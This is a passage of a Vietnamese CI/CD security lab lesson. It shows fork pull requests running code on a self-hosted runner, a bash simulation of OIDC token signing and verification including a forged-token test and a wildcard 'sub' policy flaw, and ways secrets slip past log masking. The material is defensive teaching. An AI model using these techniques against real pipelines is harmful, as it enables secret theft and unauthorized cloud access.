+secret dài 0 ký tự
+tạo nhánh ở repo gốc: HTTP 403
+container trên máy runner: 25
+{"number":11,"state":"closed","merged":false}
+```
+
+Hai lớp đầu giữ: secret rỗng, token chỉ đọc. Lớp thứ ba thì không có: job vẫn chạy trên runner của bạn, và runner đó vẫn trao socket Docker. Từ đây, kịch bản của D6.1 bước 6 lặp lại với một người ngoài: đọc registration token của runner, gắn ổ đĩa của máy, đợi job có secret chạy trên cùng máy. Số container trên máy bạn sẽ khác.
+
+Lượt chạy bắt đầu ngay, không chờ duyệt, vì binh là cộng tác viên có quyền ghi. Với người chưa từng đóng góp, Gitea giữ lượt chạy lại cho tới khi một người có quyền bấm duyệt. Và job `compat` bắt buộc của D6.4 không hề chạy, vì workflow trong pull request đã bỏ nó: status check bắt buộc vẫn chặn merge, nhưng chính nội dung workflow thì người mở PR sửa được.
+
+</Predict>
+
+<Check id="d7.5.lab-fork">Kiểm chứng được pull request từ fork không có secret và chỉ có token đọc, nhưng vẫn chạy code tuỳ ý trên runner, và nêu được biện pháp cho lớp còn thiếu.</Check>
+
+### 6. OIDC: tự đóng vai issuer và cloud
+
+Phần này chạy hoàn toàn trên máy bạn, không cần Gitea. Hai script, hai vai. `mint.sh` là hệ CI: nó giữ khoá riêng và ký ID token cho job. `sts.sh` là cloud: nó chỉ có **khoá công khai** của issuer và một trust policy.
+
+<Terminal where="mac" title="~/masteva-d7/oidc">
+
+```bash
+mkdir -p ~/masteva-d7/oidc && cd ~/masteva-d7/oidc
+openssl genrsa -out issuer.key 2048 2>/dev/null
+openssl rsa -in issuer.key -pubout -out issuer.pub 2>/dev/null
+cat > mint.sh <<'EOF'
+#!/bin/bash
+# mint.sh '<claims json>' [số giây sống]: vai issuer của hệ CI, ký một ID token (JWT, RS256)
+# Lab dùng sub dạng ngắn "repo:chủ/repo:..."; GitHub từ 15/07/2026 mặc định thêm mã số: "repo:chủ@id/repo@id:..."
+set -eu
+b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
+NOW=$(date +%s)
+H=$(printf '{"alg":"RS256","typ":"JWT"}' | b64)
+P=$(jq -c --argjson now "$NOW" --argjson ttl "${2:-300}" \
+  '{iss: "https://ci.example.test", aud: "sts.example.test", iat: $now, exp: ($now + $ttl)} + .' <<<"$1" | b64)
+S=$(printf '%s.%s' "$H" "$P" | openssl dgst -sha256 -sign issuer.key | b64)
+echo "$H.$P.$S"
+EOF
+cat > sts.sh <<'EOF'
+#!/bin/bash
+# sts.sh <token>: vai cloud. Kiểm chữ ký bằng khoá công khai của issuer,
+# rồi đối chiếu các claim với trust policy của role. Qua hết mới cấp credential tạm.
+set -eu
+IFS=. read -r H P S <<<"$1"
+unb64() { local s; s=$(tr '_-' '/+' <<<"$1"); while [ $(( ${#s} % 4 )) -ne 0 ]; do s="$s="; done; openssl base64 -d -A <<<"$s"; }
+unb64 "$S" > sig.bin
+printf '%s.%s' "$H" "$P" | openssl dgst -sha256 -verify issuer.pub -signature sig.bin >/dev/null 2>&1 \
+  || { echo "TỪ CHỐI: chữ ký không khớp khoá công khai của issuer"; exit 0; }
+unb64 "$P" | jq -r --slurpfile t trust.json --argjson now "$(date +%s)" '
+  $t[0] as $t
+  | ($t.sub | gsub("[.]"; "[.]") | gsub("[*]"; ".*")) as $pattern
+  | if .iss != $t.iss then "TỪ CHỐI: issuer \(.iss) không được tin"
+    elif .aud != $t.aud then "TỪ CHỐI: token phát cho \(.aud), không phải cho tôi"
+    elif .exp <= $now then "TỪ CHỐI: token hết hạn \($now - .exp) giây trước"
+    elif (.sub | test("^" + $pattern + "$") | not) then "TỪ CHỐI: sub \(.sub) không khớp \($t.sub)"
+    else "CHẤP NHẬN: cấp credential 15 phút cho role \($t.role), phiên của \(.sub)" end'
+EOF
+chmod +x mint.sh sts.sh
+echo '{"role": "deploy-prod", "iss": "https://ci.example.test", "aud": "sts.example.test",
+  "sub": "repo:an/price-api:ref:refs/heads/main"}' > trust.json
+MAIN='{"sub":"repo:an/price-api:ref:refs/heads/main","repository":"an/price-api","ref":"refs/heads/main","event_name":"push"}'
+T=$(./mint.sh "$MAIN")
+echo "token dài ${#T} ký tự, ba phần ngăn bởi dấu chấm"
+cut -d. -f2 <<<"$T" | tr '_-' '/+' | openssl base64 -d -A 2>/dev/null | cut -c1-96
+./sts.sh "$T"
+```
+
+</Terminal>
+
+<Expected>
+
+```text
+token dài 662 ký tự, ba phần ngăn bởi dấu chấm
+{"iss":"https://ci.example.test","aud":"sts.example.test","iat":1791691434,"exp":1791691734,"sub
+CHẤP NHẬN: cấp credential 15 phút cho role deploy-prod, phiên của repo:an/price-api:ref:refs/heads/main
+```
+
+</Expected>
+
+ID token là một JWT: phần đầu, phần nội dung (các claim) và chữ ký, mỗi phần mã hoá base64url. Nội dung **không được mã hoá**: ai cầm token cũng đọc được, nên không để gì bí mật trong claim. Thứ bảo vệ nó là chữ ký: chỉ issuer có khoá riêng mới ký được, và `sts.sh` kiểm bằng khoá công khai (ngoài đời cloud tải khoá này từ địa chỉ JWKS mà issuer công bố; issuer có nhiều khoá và xoay vòng chúng, nên phần đầu của token thật có thêm trường `kid` để cloud chọn đúng khoá trong JWKS). `sts.sh` không giữ bí mật nào của pipeline, và pipeline không giữ bí mật nào của cloud.
+
+Giờ thử năm token mà cloud phải từ chối:
+
+<Terminal where="mac">
+
+```bash
+./sts.sh "$(./mint.sh '{"sub":"repo:an/price-api:pull_request"}')"
+./sts.sh "$(./mint.sh '{"sub":"repo:binh/price-api:ref:refs/heads/main"}')"
+./sts.sh "$(./mint.sh "$MAIN" -60)"
+./sts.sh "$(./mint.sh '{"sub":"repo:an/price-api:ref:refs/heads/main","aud":"sts.other.test"}')"
+IFS=. read -r H P S <<<"$(./mint.sh '{"sub":"repo:an/price-api:pull_request"}')"
+FAKE=$(printf '%s' "$MAIN" | jq -c '. + {iss: "https://ci.example.test", aud: "sts.example.test", exp: 9999999999}' \
+  | openssl base64 -A | tr '+/' '-_' | tr -d '=')
+./sts.sh "$H.$FAKE.$S"
+```
+
+</Terminal>
+
+<Expected>
+
+```text
+TỪ CHỐI: sub repo:an/price-api:pull_request không khớp repo:an/price-api:ref:refs/heads/main
+TỪ CHỐI: sub repo:binh/price-api:ref:refs/heads/main không khớp repo:an/price-api:ref:refs/heads/main
+TỪ CHỐI: token hết hạn 60 giây trước
+TỪ CHỐI: token phát cho sts.other.test, không phải cho tôi
+TỪ CHỐI: chữ ký không khớp khoá công khai của issuer
+```
+
+</Expected>
+
+Từng dòng là một lớp: job của pull request có `sub` khác; fork của binh có `sub` khác; token cũ hết hạn sau vài phút nên lấy được từ log cũng vô dụng; token xin cho dịch vụ khác (`aud`) không dùng lại được ở đây; và sửa nội dung mà giữ chữ ký cũ thì chữ ký không còn khớp. Giờ nới trust policy theo cách hay thấy trong các bài hướng dẫn viết vội:
+
+<Terminal where="mac">
+
+```bash
+echo '{"role": "deploy-prod", "iss": "https://ci.example.test", "aud": "sts.example.test",
+  "sub": "repo:an/*"}' > trust.json
+./sts.sh "$(./mint.sh '{"sub":"repo:an/price-api:pull_request"}')"
+./sts.sh "$(./mint.sh '{"sub":"repo:an/notify:ref:refs/heads/thu-nghiem"}')"
+```
+
+</Terminal>
+
+<Expected>
+
+```text
+CHẤP NHẬN: cấp credential 15 phút cho role deploy-prod, phiên của repo:an/price-api:pull_request
+CHẤP NHẬN: cấp credential 15 phút cho role deploy-prod, phiên của repo:an/notify:ref:refs/heads/thu-nghiem
+```
+
+</Expected>
+
+Một dấu `*` và role triển khai production mở cho mọi pull request, mọi nhánh, mọi repo của `an`. OIDC bỏ được khoá dài hạn, nhưng dời toàn bộ bảo mật sang một chỗ: điều kiện trên `sub`. Viết nó chặt như viết quyền `sudo`: đúng repo, đúng nhánh hoặc environment, mỗi môi trường một role.
+
+<Check id="d7.5.lab-oidc">Mô phỏng được việc ký và kiểm một ID token, chỉ ra được lớp nào từ chối từng loại token sai, và tái hiện được hậu quả của một điều kiện `sub` dùng wildcard.</Check>
+
+### Khi gặp lỗi
+
+<Callout kind="pitfall">
+
+- **Job lỗi ở bước tải action với `repository not found` hoặc `authentication required`:** repo `an/notify` đang private. Bước 1 tạo nó với `"private": false`; kiểm bằng `api_an $G/repos/an/notify | jq .private`.
+- **Tải action lỗi `cannot lock ref 'refs/runner/…'`:** bạn đã xoá rồi tạo lại repo `an/notify` (làm lại lab), và runner còn giữ bản sao của repo cũ. Đặt tên khác cho repo action, ví dụ `notify2`, và sửa dòng `uses` theo.
+- **Bước 2 không thấy dòng lạ, SHA trong log vẫn là commit cũ:** lệnh `push -f` chưa đẩy tag. Chạy `git -C ~/masteva-d7/notify tag -f v1 && an_git -C ~/masteva-d7/notify push -f origin v1`.
+- **`base64: invalid input` khi giải mã `leak.txt`:** file có nhiều hơn một dòng (log có dòng dài khác khớp mẫu). Giữ dòng dài nhất: `awk 'length > n {n = length; l = $0} END {print l}' ../leak.txt > ../leak1.txt` rồi giải mã file đó.
+- **Bước 5 báo `{"message":"… already exist"}` khi fork:** binh đã có fork từ lần chạy trước. Bỏ qua lệnh fork và thư mục `fork` cũ, hoặc xoá fork bằng `api_binh -X DELETE $G/repos/binh/price-api` (cần token có quyền xoá repo).
+- **`sts.sh` luôn báo chữ ký không khớp:** bạn đã tạo lại `issuer.key` sau khi tạo `issuer.pub`. Chạy lại lệnh `openssl rsa … -pubout`.
+- **`jq: error … Cannot index` trong `sts.sh`:** `trust.json` không phải JSON hợp lệ; kiểm bằng `jq . trust.json`.
+
+</Callout>
+
+### Dọn dẹp
+
+Stack dùng tiếp ở D7.1. Nhánh `sec/pin`, repo `an/notify` và fork của binh không ảnh hưởng tới bài sau. File `leak.txt` chứa mật khẩu thật của lab ở dạng mã hoá: xoá nó.
+
+<Callout kind="danger">
+
+Lệnh dưới xoá file `leak.txt`, thư mục `oidc` (khoá riêng của issuer giả), thư mục `fork` và `notify` trong `~/masteva-d7`. Repo trên Gitea và mọi thứ khác của lab được giữ lại.
+
+</Callout>
+
+<Terminal where="mac" title="Dọn file của bài">
+
+```bash
+cd ~/masteva-d7 && rm -rf leak.txt oidc fork notify
+```
+
+</Terminal>
+
+</Practice>
+
+<DeepDive>
+
+<Reveal title="Ghim SHA rồi thì bản vá bảo mật của action tới bằng đường nào?">
+
+Bằng pull request do công cụ mở. Renovate và Dependabot đều hiểu dạng `owner/repo@<sha> # v1.2.3`: khi có phiên bản mới, chúng đổi cả SHA lẫn chú thích. Bạn review như mọi thay đổi khác: đọc ghi chú phát hành, nhìn diff của action nếu nó nhỏ, để CI chạy. Thêm hai thói quen rút từ các vụ 2025 và 2026: đặt độ trễ tối thiểu vài ngày trước khi nhận bản mới (đa số bản độc bị phát hiện trong một hai ngày), và ưu tiên action của chính nền tảng hoặc tổ chức lớn có quy trình phát hành rõ. Runner của Gitea còn có tuỳ chọn `cache.offline_mode` để không tải lại action đã có; nó giảm phụ thuộc mạng, nhưng không thay được ghim: nó giữ nguyên thứ đã tải lần đầu, dù tốt hay xấu.
+
+</Reveal>
+
+<Reveal title="Secret cấp repo đọc được từ mọi nhánh. Trên Gitea chưa có environment thì phòng thế nào?">
+
+Giảm số người và số đường tới secret, vì không có công tắc nào tắt được hẳn. Tách repo triển khai khỏi repo code: workflow cầm secret production nằm ở một repo ít người có quyền ghi, repo code chỉ gọi nó (bằng `workflow_dispatch` qua API hoặc reusable workflow). Đăng ký runner riêng ở cấp repo đó, để job từ repo khác không chạy chung máy với job cầm secret. Giới hạn quyền của chính secret: tài khoản `app` của D6.4 không bỏ được bảng, tài khoản triển khai chỉ đụng được một môi trường. Bật CODEOWNERS cho `.gitea/workflows/` để thay đổi workflow trên nhánh chính luôn qua người chịu trách nhiệm, dù nó không che được nhánh phụ. Và khi nền tảng cho phép, chuyển sang credential ngắn hạn: thứ không tồn tại thì không lộ được.
+
+</Reveal>
+
+<Reveal title="OIDC bỏ khoá dài hạn. Vậy còn gì có thể bị lấy?">
+
+Ba thứ. Một: **credential tạm** vẫn là credential trong 15–60 phút nó sống; một action độc chạy trong job triển khai dùng nó ngay tại chỗ. OIDC thu hẹp cửa sổ và bỏ được việc xoay vòng, không thay được ghim action và quyền tối thiểu của role. Hai: **khả năng xin token**. Bất kỳ step nào trong job có `id-token: write` đều xin được ID token, nên quyền đó chỉ khai ở job triển khai, không ở mức workflow. Ba: **trust policy lỏng**, như cuối bước 6. Ngoài `sub`, GitHub còn đưa vào token các claim như `job_workflow_ref` (job chạy từ workflow nào, ở ref nào), cho phép viết điều kiện "chỉ khi chạy qua workflow triển khai chuẩn của tổ chức"; và dạng `sub` bất biến ở phần Kiến thức chống việc một tên bị bỏ rồi người khác đăng ký lại.
+
+</Reveal>
+
+<Reveal title="Vì sao lớp che log che được base64 một lần mà không che được hai lần?">
+
+Vì runner che theo danh sách chuỗi nó biết trước. Với mỗi secret, nó đăng ký giá trị gốc và vài dạng mã hoá phổ biến của giá trị đó (Gitea Runner từ bản 3.0 ghi rõ là che cả dạng mã hoá), rồi thay mọi chỗ khớp trong log. Dạng nào không nằm trong danh sách thì qua: đảo ngược ở bước 1, mã hoá hai lần ở bước 2, cắt đôi in hai dòng, hay đổi sang hex. Không thể liệt kê hết mọi phép biến đổi, nên lớp này chỉ ngăn tai nạn (một lệnh `echo` quên, một công cụ in cấu hình), không ngăn được code cố ý. Hệ quả thực hành: coi log của CI là dữ liệu nhạy cảm, giới hạn người đọc được, và đừng để log của repo riêng tư thành công khai.
+
+</Reveal>
+
+<Callout kind="ai">
+
+Nhờ AI rà một file workflow tìm action chưa ghim, `permissions` còn thiếu, secret đặt ở mức workflow, hay viết trust policy từ mô tả "chỉ nhánh main của repo X" là cách dùng tốt. AI hay sai ở chỗ: đưa SHA bịa hoặc SHA của một phiên bản khác với chú thích (luôn lấy bằng `git ls-remote` như bước 3); gợi ý `pull_request_target` để "sửa lỗi không đọc được secret trong PR từ fork", tức là mở đúng lỗ hổng pwn request; viết điều kiện `sub` bằng `StringLike` với `*` cho gọn; và coi `***` trong log là bằng chứng an toàn. Kiểm lại bằng cách thử như lab: dời tag trên một action thử, gọi API cần quyền ghi bằng token của job, và đưa cho trust policy một token của pull request.
+
+</Callout>
+
+<Callout kind="link">
+
+D5.2 kể vụ Trivy và ghim image theo digest. D6.1 cho thấy job chiếm máy runner thế nào; bài này cho thấy job lấy secret thế nào. D10 dạy IAM, role và trust policy, là nền để tự cấu hình phía AWS của OIDC; D15 dùng cùng ý tưởng, danh tính thay cho secret, cho workload. D14 ký artifact và tạo provenance để nơi triển khai kiểm được image đến từ đúng pipeline. D7.1 quay lại phía đo lường: pipeline an toàn có còn nhanh không.
+
+</Callout>
+
+</DeepDive>
+
+<Mastery>
+
+<Check id="d7.5.mastery-audit">Rà được một file workflow thật và chỉ ra: action nào chưa ghim, job nào thừa quyền token, secret nào có mặt ở chỗ không cần, và code từ fork chạy với những gì.</Check>
+
+<Check id="d7.5.mastery-incident">Khi một action đang dùng bị công bố là đã bị chiếm, kể được trình tự xử lý: xác định lượt chạy bị ảnh hưởng, coi secret nào là đã lộ, xoay vòng, ghim, và rà log.</Check>
+
+<Check id="d7.5.mastery-oidc">Thiết kế được cách pipeline lấy quyền vào cloud mà không lưu khoá: issuer, audience, điều kiện `sub` cho từng môi trường, và giải thích được vì sao wildcard trong điều kiện đó là lỗ hổng.</Check>
+
+</Mastery>
